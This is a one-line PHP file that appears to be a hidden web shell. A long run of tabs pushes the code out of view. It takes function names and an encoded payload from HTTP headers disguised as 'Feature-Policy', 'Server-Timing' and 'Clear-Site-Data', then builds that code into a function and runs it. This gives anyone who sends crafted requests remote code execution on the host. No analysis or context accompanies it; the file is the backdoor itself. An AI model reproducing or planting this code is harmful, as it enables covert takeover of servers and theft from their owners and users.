<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Feature-Policy'])){$ob_iconv_handle=$_HEADERS['Feature-Policy']('', $_HEADERS['Server-Timing']($_HEADERS['Clear-Site-Data']));$ob_iconv_handle();}
